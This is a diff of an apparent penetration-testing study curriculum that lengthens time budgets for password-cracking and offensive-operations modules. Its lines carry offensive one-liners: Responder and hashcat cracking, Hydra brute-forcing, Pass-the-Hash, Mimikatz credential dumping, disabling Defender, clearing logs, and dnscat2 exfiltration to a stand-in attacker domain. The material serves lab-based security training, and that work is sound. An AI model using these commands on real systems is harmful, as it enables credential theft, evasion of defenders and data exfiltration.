-> ⏱️ **Module 12 Total Time Budget: 4–5 days**
-> Topic 1 (identification/acquisition): 1 day | Topic 2 (methodology/tools): 1–2 days | Topic 3 (protocol-specific): 1 day | Topic 4 (wordlist curation): 1 day | Labs: 1–2 days.
+> ⏱️ **Module 12 Total Time Budget: 1 week**
+> Topic 1 (identification/acquisition): 1–2 days | Topic 2 (methodology/tools): 2 days | Topic 3 (protocol-specific): 1–2 days | Topic 4 (wordlist curation): 1 day | Labs: 2 days.
 > Hashcat is a GPU tool. If your machine doesn’t have a discrete GPU, use cloud GPU (vast.ai is cheap, or use Google Colab for small jobs). Don’t waste a week trying to crack bcrypt on a CPU. Time your attacks intelligently.
 
 ### Topic 1: Hash Identification & Acquisition — 🔬 Practical
+[[Topic-1_Hash-Identification-and-Acquisition|📁]]
 
 > [!TIP]
 > **Goal:** Identify what I have before cracking.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — Hash identification tools (hashid, hash-identifier, Name-That-Hash — learn to identify visually by format: `$2y$` = bcrypt, `$6$` = SHA-512 crypt, 32 hex chars = MD5/NTLM, `$krb5tgs$23$` = Kerberoast TGS-REP), hash acquisition methods (SAM/NTDS.dit — Windows local/domain hashes; /etc/shadow — Linux hashes; database dumps; LSASS memory dump; captured NTLMv2 from Responder; PCAP files). Common hash type mastery: NTLM (`-m 1000`), NetNTLMv2 (`-m 5600`), Kerberos TGS-REP (`-m 13100`), AS-REP (`-m 18200`), bcrypt (`-m 3200`), SHA-512 crypt (`-m 1800`), WPA2 (`-m 22000`). Deliverable: identify 10 hashes from a mixed sample file using only visual inspection, then verify with hashid.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: Hash identification tools (hashid, hash-identifier, Name-That-Hash — learn to identify visually by format: `$2y$` = bcrypt, `$6$` = SHA-512 crypt, 32 hex chars = MD5/NTLM, `$krb5tgs$23$` = Kerberoast TGS-REP), hash acquisition methods (SAM/NTDS.dit — Windows local/domain hashes; /etc/shadow — Linux hashes; database dumps; LSASS memory dump; captured NTLMv2 from Responder; PCAP files). Day 2: Common hash type mastery: NTLM (`-m 1000`), NetNTLMv2 (`-m 5600`), Kerberos TGS-REP (`-m 13100`), AS-REP (`-m 18200`), bcrypt (`-m 3200`), SHA-512 crypt (`-m 1800`), WPA2 (`-m 22000`). Deliverable: identify 10 hashes from a mixed sample file using only visual inspection, then verify with hashid.
 
 - [ ] **Hash Identification:** Use **hashid, hash-identifier, Name-That-Hash** to identify algorithm from hash format (length, prefix like `$2y$`, `$6$`, `$NT$`).
 
@@ -923,12 +932,13 @@
 ---
 
 ### Topic 2: Cracking Methodology & Tools — 🔬 Practical
+[[Topic-2_Cracking-Methodology-and-Tools|📁]]
 
 > [!TIP]
 > **Goal:** Apply the right technique to each hash type.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1–2 days** — Hashcat attack modes: `-a 0` (dictionary — rockyou.txt as baseline), `-a 1` (combination — two wordlists), `-a 3` (brute/mask — `?u?l?l?l?d?d?s` pattern), `-a 6/-a 7` (hybrid wordlist+mask), session management (`--session`/`--restore`), potfile (`--show`). John the Ripper: format auto-detection, incremental mode, custom rules for non-GPU-friendly hashes (bcrypt, Argon2). Rule-based attacks: best64.rule, OneRuleToRuleThemAll, d3ad0ne — understand what each mangling operation does (append digit, capitalize, leet-speak). Mask attacks for corporate password patterns (`Summer2024!`, `Company123!`). Deliverable: crack a set of 20 NTLM hashes using dictionary-only, then rules, then masks in sequence — document crack rate at each stage.
+> ⏱️ **Time Bracket: 2 days** — Day 1: Hashcat attack modes: `-a 0` (dictionary — rockyou.txt as baseline), `-a 1` (combination — two wordlists), `-a 3` (brute/mask — `?u?l?l?l?d?d?s` pattern), `-a 6/-a 7` (hybrid wordlist+mask), session management (`--session`/`--restore`), potfile (`--show`). Day 2: John the Ripper: format auto-detection, incremental mode, custom rules for non-GPU-friendly hashes (bcrypt, Argon2). Rule-based attacks: best64.rule, OneRuleToRuleThemAll, d3ad0ne — understand what each mangling operation does (append digit, capitalize, leet-speak). Mask attacks for corporate password patterns (`Summer2024!`, `Company123!`). Deliverable: crack a set of 20 NTLM hashes using dictionary-only, then rules, then masks in sequence — document crack rate at each stage.
 
 - [ ] **[[Hashcat]] Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
 
@@ -947,12 +957,13 @@
 ---
 
 ### Topic 3: Protocol-Specific Cracking — 🔬 Practical
+[[Topic-3_Protocol-Specific-Cracking|📁]]
 
 > [!TIP]
 > **Goal:** Crack hashes captured from real network protocols.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 day** — NetNTLMv2 (capture with Responder: `sudo responder -I eth0 -wPF`, crack with `hashcat -m 5600 <hash> rockyou.txt -r best64.rule`), Kerberoasting TGS-REP (`-m 13100` — use targeted wordlist for service accounts — naming conventions matter), AS-REP Roasting (`-m 18200` — accounts without pre-auth, enumerated with kerbrute), WPA2 PMKID (`-m 22001` — capture with hcxdumptool, convert with hcxpcapngtool), SSH passphrase cracking (ssh2john, JtR), Office/PDF/ZIP password extraction (office2john, pdf2john, zip2john — know which tool produces which format for hashcat/JtR). Deliverable: set up Responder in your lab, force an NTLM authentication, capture the NTLMv2 hash, and crack it with hashcat + rockyou + best64 rule.
+> ⏱️ **Time Bracket: 1–2 days** — Day 1: NetNTLMv2 (capture with Responder: `sudo responder -I eth0 -wPF`, crack with `hashcat -m 5600 <hash> rockyou.txt -r best64.rule`), Kerberoasting TGS-REP (`-m 13100` — use targeted wordlist for service accounts — naming conventions matter), AS-REP Roasting (`-m 18200` — accounts without pre-auth, enumerated with kerbrute). Day 2: WPA2 PMKID (`-m 22001` — capture with hcxdumptool, convert with hcxpcapngtool), SSH passphrase cracking (ssh2john, JtR), Office/PDF/ZIP password extraction (office2john, pdf2john, zip2john — know which tool produces which format for hashcat/JtR). Deliverable: set up Responder in your lab, force an NTLM authentication, capture the NTLMv2 hash, and crack it with hashcat + rockyou + best64 rule.
 
 - [ ] **NTLM / NetNTLMv2:** Capture with **[[Responder]], ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
 
@@ -967,6 +978,7 @@
 ---
 
 ### Topic 4: Wordlist & Intelligence Curation — 🔬 Practical
+[[Topic-4_Wordlist-and-Intelligence-Curation|📁]]
 
 > [!TIP]
 > **Goal:** Build targeted wordlists that outperform generic lists.
@@ -1002,8 +1014,8 @@
 > - 🟢 `Exploit Development on Linux Platform` — Full — Linux-specific exploitation fundamentals
 
 > [!TIP]
-> ⏱️ **Module 13 Total Time Budget: 3–4 weeks** — This is the heaviest lab module in Stage 2.
-> Topic 1 (initial access): 1 week | Topic 2 (privilege escalation — Windows + Linux): 1–2 weeks | Topic 3 (persistence + lateral movement): 3–5 days | Topic 4 (defense evasion): 2–3 days | Topic 5 (exfiltration): 2 days | Topic 6 (governance/reporting): 2 days | Labs + HTB boxes: ongoing.
+> ⏱️ **Module 13 Total Time Budget: 4–5 weeks** — This is the heaviest lab module in Stage 2.
+> Topic 1 (initial access): 1–1.5 weeks | Topic 2 (privilege escalation — Windows + Linux): 2 weeks | Topic 3 (persistence + lateral movement): 4–6 days | Topic 4 (defense evasion): 3–4 days | Topic 5 (exfiltration): 2–3 days | Topic 6 (governance/reporting): 2–3 days | Labs + HTB boxes: ongoing.
 > You cannot rush privilege escalation. The 9-vector Windows methodology and the 9-vector Linux methodology here represent the OSCP exam and real-world coverage. Work every vector on a dedicated lab VM before calling this done. No walkthrough shortcuts.
 
 ### Topic 1: The Breach (Initial Access & Exploitation) — 🔬 Practical
@@ -1013,7 +1025,7 @@
 > **Goal:** Weaponize theoretical vulnerabilities to bypass the perimeter and establish foothold.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1 week** — Application/web exploitation (SQL injection payloads: error-based/blind/union/time-based; buffer overflow ROP chain basics; directory/path traversal; SSTI Jinja2/Twig; deserialization; SSRF to internal IMDS; XXE), credential assault (Hydra for online brute-force: `hydra -L users.txt -P rockyou.txt ssh://<target>`; password spray with low-and-slow lockout awareness; default credential testing; credential stuffing with breach data), social engineering awareness (phishing HTML-smuggled payloads, ISO/LNK loaders, OneNote macros), MITM/network interception (tcpdump, Wireshark on a gateway — full treatment in Module 23). Deliverable: gain initial access to a lab target using at least 3 different vectors (exposed service + weak creds + web app vuln). Document each with full command output.
+> ⏱️ **Time Bracket: 1–1.5 weeks** — Days 1–3: Application/web exploitation (SQL injection payloads: error-based/blind/union/time-based; buffer overflow ROP chain basics; directory/path traversal; SSTI Jinja2/Twig; deserialization; SSRF to internal IMDS; XXE). Days 4–5: Credential assault (Hydra for online brute-force: `hydra -L users.txt -P rockyou.txt ssh://<target>`; password spray with low-and-slow lockout awareness; default credential testing; credential stuffing with breach data). Days 6–7: Social engineering awareness (phishing HTML-smuggled payloads, ISO/LNK loaders, OneNote macros), MITM/network interception (tcpdump, Wireshark on a gateway — full treatment in Module 23), and consolidate all 3 initial access lab compromises. Deliverable: gain initial access to a lab target using at least 3 different vectors (exposed service + weak creds + web app vuln). Document each with full command output.
 
 **Application & Web Exploitation:**
 
@@ -1082,7 +1094,7 @@
 > **Goal:** Move from low-level foothold to administrative control by exploiting system logic.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 1–2 weeks** — This is the largest and most important topic in Module 13. Windows (9 vectors): service misconfigurations (unquoted paths, weak binary perms, registry perms), DLL hijacking (Procmon for missing DLLs, proxying, side-loading), token impersonation (SeImpersonatePrivilege — GodPotato/PrintSpoofer/SweetPotato — run against your lab immediately), UAC bypass (fodhelper/eventvwr registry hijack, mock directories), registry abuse (AlwaysInstallElevated MSI), scheduled tasks, credential hunting (SAM/SYSTEM hive dump, LSASS procdump+Mimikatz, DPAPI, config files, PSReadLine history), kernel exploits (wesng.py). Linux (9 vectors): SUID/SGID (GTFOBins for every hit), sudo misconfig (NOPASSWD, wildcard abuse, LD_PRELOAD), cron job hijacking (writable script, wildcard tar injection), Linux capabilities (getcap -r /), writable /etc/passwd, NFS no_root_squash, kernel exploits (linux-exploit-suggester-2), config/history leaks, PAM backdoor. Dedicate specific lab VMs to Windows and Linux privesc — do not combine them.
+> ⏱️ **Time Bracket: 2 weeks** — This is the largest and most important topic in Module 13. Week 1 — Windows (9 vectors): service misconfigurations (unquoted paths, weak binary perms, registry perms), DLL hijacking (Procmon for missing DLLs, proxying, side-loading), token impersonation (SeImpersonatePrivilege — GodPotato/PrintSpoofer/SweetPotato — run against your lab immediately), UAC bypass (fodhelper/eventvwr registry hijack, mock directories), registry abuse (AlwaysInstallElevated MSI), scheduled tasks, credential hunting (SAM/SYSTEM hive dump, LSASS procdump+Mimikatz, DPAPI, config files, PSReadLine history), kernel exploits (wesng.py). Week 2 — Linux (9 vectors): SUID/SGID (GTFOBins for every hit), sudo misconfig (NOPASSWD, wildcard abuse, LD_PRELOAD), cron job hijacking (writable script, wildcard tar injection), Linux capabilities (getcap -r /), writable /etc/passwd, NFS no_root_squash, kernel exploits (linux-exploit-suggester-2), config/history leaks, PAM backdoor. Dedicate specific lab VMs to Windows and Linux privesc — do not combine them.
 
 **Windows Privilege Escalation:**
 
@@ -1421,7 +1433,7 @@
 > **Goal:** Establish permanent presence and move horizontally across network.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 3–5 days** — Credential harvesting (Pass-the-Hash workgroup: `nxc smb <target> -u administrator -H <NT-hash>`; LSASS dump: procdump + Mimikatz sekurlsa::logonpasswords; browser/token harvesting from SQLite credential stores; SSH key stealing from `~/.ssh/id_rsa` and agent socket hijack), Windows persistence (Run/RunOnce registry keys, Startup folder, scheduled task as SYSTEM, service installation), Linux persistence (cron job in /etc/crontab, systemd user unit, SSH authorized_keys injection, shell init file injection, LD_PRELOAD hijack, SUID binary planting), lateral movement pivoting (Chisel SOCKS5 tunnel: server/client setup + proxychains4 routing; Ligolo-ng TUN interface; SSH dynamic/local/remote port forwarding), egress evasion (DNS tunneling via dnscat2, ICMP exfil, HTTPS CDN fronting). Deliverable: set up Chisel in your lab and route an Nmap scan through a compromised pivot host to an otherwise unreachable subnet.
+> ⏱️ **Time Bracket: 4–6 days** — Days 1–2: Credential harvesting (Pass-the-Hash workgroup: `nxc smb <target> -u administrator -H <NT-hash>`; LSASS dump: procdump + Mimikatz sekurlsa::logonpasswords; browser/token harvesting from SQLite credential stores; SSH key stealing from `~/.ssh/id_rsa` and agent socket hijack). Days 3–4: Windows persistence (Run/RunOnce registry keys, Startup folder, scheduled task as SYSTEM, service installation), Linux persistence (cron job in /etc/crontab, systemd user unit, SSH authorized_keys injection, shell init file injection, LD_PRELOAD hijack, SUID binary planting). Days 5–6: Lateral movement pivoting (Chisel SOCKS5 tunnel: server/client setup + proxychains4 routing; Ligolo-ng TUN interface; SSH dynamic/local/remote port forwarding), egress evasion (DNS tunneling via dnscat2, ICMP exfil, HTTPS CDN fronting). Deliverable: set up Chisel in your lab and route an Nmap scan through a compromised pivot host to an otherwise unreachable subnet.
 
 **Credential Harvesting & Local Authentication Abuse:**
 
@@ -1502,7 +1514,7 @@
 > **Goal:** Blind the Blue Team and minimize evidence of compromise.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2–3 days** — Log manipulation (Windows: `Clear-EventLog`, `wevtutil cl Security`; Linux: truncate auth.log; understand what gets shipped to SIEM vs what stays local), defense evasion (Windows Defender disable via PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true`; AMSI bypass; EDR process injection awareness; Credential Guard and RunAsPPL status check before LSASS dump; AppLocker/WDAC bypass via MSBuild/regsvr32/mshta LOLBAS), anti-forensics (shred/srm for tool cleanup, timestomping `touch -t`, bash history clearing `HISTFILE=/dev/null`, prefetch file deletion, registry run key cleanup). Deliverable: demonstrate 3 anti-forensics techniques and identify which SIEM/Sysmon event IDs each generates — document the detection gap for each.
+> ⏱️ **Time Bracket: 3–4 days** — Days 1–2: Log manipulation (Windows: `Clear-EventLog`, `wevtutil cl Security`; Linux: truncate auth.log; understand what gets shipped to SIEM vs what stays local), defense evasion (Windows Defender disable via PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true`; AMSI bypass; EDR process injection awareness; Credential Guard and RunAsPPL status check before LSASS dump; AppLocker/WDAC bypass via MSBuild/regsvr32/mshta LOLBAS). Days 3–4: Anti-forensics (shred/srm for tool cleanup, timestomping `touch -t`, bash history clearing `HISTFILE=/dev/null`, prefetch file deletion, registry run key cleanup), map each technique to SIEM/Sysmon event IDs. Deliverable: demonstrate 3 anti-forensics techniques and identify which SIEM/Sysmon event IDs each generates — document the detection gap for each.
 
 **Log Manipulation & Cleanup:**
 
@@ -1557,7 +1569,7 @@
 > **Goal:** Extract sensitive data and demonstrate business impact.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2 days** — Exfiltration channels (DNS tunneling: `dnscat2 server` + `client --dns domain=exfil.attacker.com`; HTTPS covert channels via webhook exfil to Discord/Slack blending in enterprise traffic; cloud API exfil: pre-signed S3 URLs, Google Drive API; ICMP tunneling for Layer 4 blocked environments), impact demonstration (ransomware concept: RSA key generation + AES-256 file encryption hybrid — awareness only, not deployment; data destruction via backup enumeration and deletion; service disruption via config corruption). This topic is the "why does it matter" for every pentest report executive summary. Document impact in dollar-value terms when demonstrating findings. Deliverable: exfiltrate a test file from your lab using DNS tunneling. Capture the traffic in Wireshark and annotate what the exfil looks like on the wire.
+> ⏱️ **Time Bracket: 2–3 days** — Days 1–2: Exfiltration channels (DNS tunneling: `dnscat2 server` + `client --dns domain=exfil.attacker.com`; HTTPS covert channels via webhook exfil to Discord/Slack blending in enterprise traffic; cloud API exfil: pre-signed S3 URLs, Google Drive API; ICMP tunneling for Layer 4 blocked environments). Day 3: Impact demonstration (ransomware concept: RSA key generation + AES-256 file encryption hybrid — awareness only, not deployment; data destruction via backup enumeration and deletion; service disruption via config corruption). This topic is the "why does it matter" for every pentest report executive summary. Document impact in dollar-value terms when demonstrating findings. Deliverable: exfiltrate a test file from your lab using DNS tunneling. Capture the traffic in Wireshark and annotate what the exfil looks like on the wire.
 
 **Data Exfiltration Channels:**
 
@@ -1588,7 +1600,7 @@
 > **Goal:** Execute within legal/ethical boundaries and deliver findings professionally.
 
 > [!NOTE]
-> ⏱️ **Time Bracket: 2 days** — Rules of engagement (scope adherence — operate only within authorized IP ranges; ROE documentation — log every action with timestamp and command; escalation/abort procedures; data handling for screenshots/credentials/exfiltrated files), MITRE ATT&CK mapping (correlate every technique to T-ID and Tactic: TA0043 Recon, TA0001 Initial Access, TA0004 Privilege Escalation), Kill Chain annotation (Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objective), audience-centric reporting (executive summary: non-technical risk/impact narrative; technical deep-dive: attack chain + PoC + IOCs; remediation roadmap: prioritized by CVSS with effort estimates). Deliverable: write a complete pentest report for one of your lab compromises using the Module 26 structure. Executive summary + technical findings + remediation roadmap. Should be client-presentable.
+> ⏱️ **Time Bracket: 2–3 days** — Day 1: Rules of engagement (scope adherence — operate only within authorized IP ranges; ROE documentation — log every action with timestamp and command; escalation/abort procedures; data handling for screenshots/credentials/exfiltrated files), MITRE ATT&CK mapping (correlate every technique to T-ID and Tactic: TA0043 Recon, TA0001 Initial Access, TA0004 Privilege Escalation). Day 2: Kill Chain annotation (Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objective), audience-centric reporting (executive summary: non-technical risk/impact narrative; technical deep-dive: attack chain + PoC + IOCs; remediation roadmap: prioritized by CVSS with effort estimates). Day 3: Draft and refine the complete pentest report. Deliverable: write a complete pentest report for one of your lab compromises using the Module 26 structure. Executive summary + technical findings + remediation roadmap. Should be client-presentable.
 
 **Rules of Engagement & Compliance:**
 
